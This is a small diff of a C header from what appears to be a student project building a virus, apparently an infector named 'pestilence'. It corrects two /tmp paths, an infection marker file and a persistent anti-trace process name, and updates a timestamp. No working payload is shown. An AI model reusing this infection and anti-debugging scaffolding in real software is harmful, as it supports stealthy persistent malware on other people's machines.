@@ -6,7 +6,7 @@
 /*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/29 20:08:14 by plamtenz          #+#    #+#             */
-/*   Updated: 2020/02/29 22:23:16 by plamtenz         ###   ########.fr       */
+/*   Updated: 2020/02/29 22:49:54 by plamtenz         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -51,7 +51,7 @@
 # include <sys/ptrace.h>
 # include <sys/mman.h>
 
-#define DEAMON_INFECTION_PATH               "tmp/yeah_dude_ur_infected"
+#define DEAMON_INFECTION_PATH               "/tmp/yeah_dude_ur_infected"
 
 /*
 **
@@ -95,7 +95,7 @@ typedef struct                      s_atp
     char                            pestilence;
 }                                   t_atp;
 
-#define PTC_NAME                    "tmp/trace_me_if_u_can" // path
+#define PTC_NAME                    "/tmp/trace_me_if_u_can" // path
 #define PROCESS_ATP                 {".trace_me_if_u_can", NULL} // process: persistent process name
 
 char                                run_atp(t_atp *atp);
